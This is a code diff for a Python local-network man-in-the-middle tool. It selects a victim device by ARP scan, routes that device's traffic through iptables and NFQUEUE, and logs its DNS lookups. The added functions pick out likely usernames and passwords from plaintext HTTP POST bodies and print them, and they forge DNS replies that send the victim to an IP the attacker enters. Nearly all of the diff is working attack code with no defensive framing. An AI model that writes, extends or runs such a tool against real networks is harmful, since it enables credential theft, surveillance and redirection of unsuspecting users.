@@ -11,13 +11,7 @@ import platform
 import ctypes
 import subprocess
 from netfilterqueue import NetfilterQueue
-from flask import Flask, render_template_string, request, redirect, url_for
-
-# Initialize Flask app
-app = Flask(__name__)
-
-# List to store intercepted HTTP requests
-intercepted_requests = []
+from flask import Flask, render_template_string, request, redirect
 
 # Check platform and privileges
 if platform.system() == "Windows":
@@ -50,7 +44,7 @@ def arp_scan(network, iface):
         except VendorNotFoundError:
             vendor = 'unrecognized device'
         print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
-    print(f'{Fore.YELLOW}0. Exit{Style.RESET_ALL} ')
+    print(f'{Fore.YELLOW}0. Exit{Style.RESET_ALL}')
     return input('\nPick a device IP: ')
 
 class Device:
@@ -67,7 +61,16 @@ class Device:
                 print('IP seems down, retrying ..')
                 continue
 
-    def capture_http(self):
+    def capture_dns(self):
+        sniff(iface=self.iface, prn=self.dns,
+              filter=f'src host {self.targetip} and udp port 53', store=0)
+
+    def dns(self, pkt):
+        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
+        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
+        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')
+
+    def http_sniff(self):
         def http_pkt_callback(pkt):
             if pkt.haslayer('Raw'):
                 raw_data = pkt['Raw'].load.decode(errors='ignore')
@@ -77,10 +80,18 @@ class Device:
                             host = raw_data.split("Host: ")[1].split("\r\n")[0]
                             path = raw_data.split("GET ")[1].split(" HTTP")[0]
                             url = f"http://{host}{path}"
-                            intercepted_requests.append({'url': url, 'raw_data': raw_data})
-                            print(f"{Fore.CYAN}Intercepted URL: {url}{Style.RESET_ALL}")
+                            print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
                         except Exception:
                             pass
+
+                    if "POST" in raw_data:
+                        if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email']) and \
+                           any(k in raw_data.lower() for k in ['password', 'pass', 'pwd']):
+                            print(f"{Fore.RED}[!] Possible Credentials Found:{Style.RESET_ALL}")
+                            for line in raw_data.split('\r\n'):
+                                if '=' in line and len(line) < 100:
+                                    print(f"{Fore.YELLOW}    {line}{Style.RESET_ALL}")
+
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
 
@@ -93,98 +104,80 @@ class Device:
         subprocess.call(f"iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
         print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')
 
-    def modify_http_content(self, request_index, new_data):
-        intercepted_requests[request_index]['raw_data'] = new_data
-        print(f"{Fore.GREEN}HTTP request modified.{Style.RESET_ALL}")
+    def dns_poison(self, spoof_ip):
+        def dns_pkt_callback(pkt):
+            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
+                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
+                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
+                send(spoofed_pkt, iface=self.iface, verbose=False)
+                print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ip}{Style.RESET_ALL}')
+        
+        nfqueue = NetfilterQueue()
+        nfqueue.bind(0, dns_pkt_callback)
+        print(f'{Fore.GREEN}Listening for DNS packets in NFQUEUE...{Style.RESET_ALL}')
+        nfqueue.run()
+
+    def http_request_modification(self):
+        app = Flask(__name__)
+
+        @app.route("/", methods=["GET", "POST"])
+        def modify_request():
+            if request.method == "POST":
+                modified_content = request.form.get("content")
+                # Here you can modify the content based on the user input
+                print(f"Modified content: {modified_content}")
+                return redirect("http://{}".format(request.form.get("host")))
+            return render_template_string("""
+                <form method="post">
+                    Host: <input type="text" name="host" value="{{request.host}}"><br>
+                    URL: <input type="text" name="url" value="{{request.path}}"><br>
+                    Content: <textarea name="content"></textarea><br>
+                    <input type="submit" value="Modify">
+                </form>
+            """)
+
+        app.run(host="0.0.0.0", port=8080)
 
     def sniff(self):
         while True:
             print(f'\n{Fore.GREEN}Select Your Choice:{Style.RESET_ALL}')
-            print(f'1. View Intercepted HTTP Requests\n2. Modify HTTP Request\n3. Exit')
+            print(f'1. DNS Sniff\n2. HTTP Sniff\n3. DNS Poison\n4. HTTP Request Modification\n5. Exit')
             try:
                 choice = int(input(f'{Fore.BLUE}Your choice: {Style.RESET_ALL}'))
             except ValueError:
                 print(f"{Fore.RED}Invalid input! Please enter a number.{Style.RESET_ALL}")
                 continue
             if choice == 1:
-                self.view_intercepted_requests()
+                self.capture_dns()
             elif choice == 2:
-                self.modify_http_request()
+                self.http_sniff()
             elif choice == 3:
+                if platform.system() == "Windows":
+                    print(f"{Fore.RED}DNS Spoofing is not supported on Windows.{Style.RESET_ALL}")
+                else:
+                    spoof_ip = input(f'{Fore.RED}Enter spoofed IP: {Style.RESET_ALL}')
+                    self.dns_poison(spoof_ip)
+            elif choice == 4:
+                self.http_request_modification()
+            elif choice == 5:
                 print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
                 break
             else:
                 print(f'{Fore.RED}Invalid choice, try again.{Style.RESET_ALL}')
 
-    def view_intercepted_requests(self):
-        if not intercepted_requests:
-            print(f"{Fore.RED}No intercepted HTTP requests yet.{Style.RESET_ALL}")
-            return
-        for idx, request in enumerate(intercepted_requests):
-            print(f"{Fore.YELLOW}{idx + 1}. {request['url']}{Style.RESET_ALL}")
-
-    def modify_http_request(self):
-        if not intercepted_requests:
-            print(f"{Fore.RED}No intercepted HTTP requests to modify.{Style.RESET_ALL}")
-            return
-        self.view_intercepted_requests()
-        try:
-            idx = int(input(f"{Fore.BLUE}Select request to modify: {Style.RESET_ALL}")) - 1
-            if 0 <= idx < len(intercepted_requests):
-                new_data = input(f"{Fore.GREEN}Enter new HTTP content: {Style.RESET_ALL}")
-                self.modify_http_content(idx, new_data)
-            else:
-                print(f"{Fore.RED}Invalid selection.{Style.RESET_ALL}")
-        except ValueError:
-            print(f"{Fore.RED}Invalid input.{Style.RESET_ALL}")
-
-# Flask routes to control and display requests
-@app.route('/')
-def index():
-    html = """
-    <html>
-        <head><title>HTTP Sniffer Control Panel</title></head>
-        <body>
-            <h1>Intercepted HTTP Requests</h1>
-            <ul>
-                {% for request in requests %}
-                    <li>
-                        <a href="{{ url_for('modify_request', request_id=loop.index0) }}">{{ request['url'] }}</a>
-                    </li>
-                {% else %}
-                    <li>No intercepted requests yet.</li>
-                {% endfor %}
-            </ul>
-        </body>
-    </html>
-    """
-    return render_template_string(html, requests=intercepted_requests)
-
-@app.route('/modify/<int:request_id>', methods=['GET', 'POST'])
-def modify_request(request_id):
-    if request.method == 'POST':
-        new_data = request.form['new_data']
-        device.modify_http_content(request_id, new_data)
-        return redirect(url_for('index'))
-    
-    html = """
-    <html>
-        <head><title>Modify HTTP Request</title></head>
-        <body>
-            <h1>Modify HTTP Request</h1>
-            <form method="post">
-                <label for="new_data">New Data:</label><br>
-                <textarea name="new_data" rows="10" cols="50">{{ request['raw_data'] }}</textarea><br>
-                <input type="submit" value="Modify Request">
-            </form>
-            <br>
-            <a href="{{ url_for('index') }}">Back to requests</a>
-        </body>
-    </html>
-    """
-    return render_template_string(html, request=intercepted_requests[request_id])
-
 if __name__ == '__main__':
-    device = Device(opts.routerip, opts.network, opts.iface)
-    threading.Thread(target=device.capture_http).start()  # Start sniffing in background
-    app.run(debug=True, use_reloader=False)  # Run Flask app
+    while True:
+        targetip = arp_scan(opts.network, opts.iface)
+        if targetip == "0":
+            print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
+            break
+        device = Device(opts.routerip, targetip, opts.iface)
+        device.enable_ip_forwarding()
+        device.set_iptables()
+        try:
+            device.sniff()
+        except KeyboardInterrupt:
+            print(f'\n{Fore.CYAN}Returning to menu...{Style.RESET_ALL}')
+            continue
